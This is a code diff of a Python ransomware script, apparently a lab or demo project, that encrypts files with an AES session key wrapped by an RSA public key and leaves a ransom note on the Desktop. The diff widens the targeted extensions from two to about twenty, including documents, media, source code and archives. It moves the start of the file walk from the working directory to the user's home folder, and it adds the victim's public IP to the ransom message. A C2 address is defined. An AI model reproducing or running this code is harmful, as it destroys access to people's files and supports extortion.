@@ -17,7 +17,7 @@ from tempfile import NamedTemporaryFile
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.Random import get_random_bytes
 
-tgt_exts = ['txt', 'png']
+tgt_exts = ['txt', 'png', 'jpg', 'pdf', 'docx', 'mp3', 'mov', 'md', 'bat', 'py', 'mp4', 'doc', 'js', 'c', 'java', '7z', 'bz2', 'zip', 'gz', 'tar', 'gif']
 REMOTE_C2='http://192.168.230.128:9000'
 PUBLIC_KEY='''-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkhgXKdG6b2S3AjafAdmc
@@ -58,8 +58,8 @@ def main():
     #print('\tEncrypted AES key: ' + str(enc_aes)) # Testing
     
     # Traverse system, encrypt files with AES session key using algorithm
-    traverse_path = os.getcwd() # Start of traverse path -- FOR TESTING
-    #traverse_path = os.path.expanduser(`~`) # Start of traverse path -- FOR DEMO
+    #traverse_path = os.getcwd() # Start of traverse path -- FOR TESTING
+    traverse_path = os.path.expanduser('~') # Start of traverse path -- FOR DEMO
     sys_files = os.walk(traverse_path) 
     for root, dir, files in sys_files:
         for file in files:
@@ -98,6 +98,7 @@ def main():
 
     # Show ransom message
     r_msg='''Oh no, your files are encrypted!
+Your IP: %s
 It look like you won't be able to access quite a few of them. However,
 we can guarantee you can get them back, if you do the following. 
 
@@ -115,7 +116,7 @@ we can guarantee you can get them back, if you do the following.
 You will receive a Decryption software in the inbox of the email used to send your key. 
 Once run, all your files will be successfully restored. Failure to follow these steps may
 result in your files being lost forever.
-Thank you!''' % (str(b64encode(aes)))
+Thank you!''' % (publicIP, str(b64encode(aes)))
 
     with open(os.path.expanduser('~')+'\\Desktop\\YOUR-FILES-ARE-ENCRYPTED.txt', 'w') as f:
         f.write(r_msg)
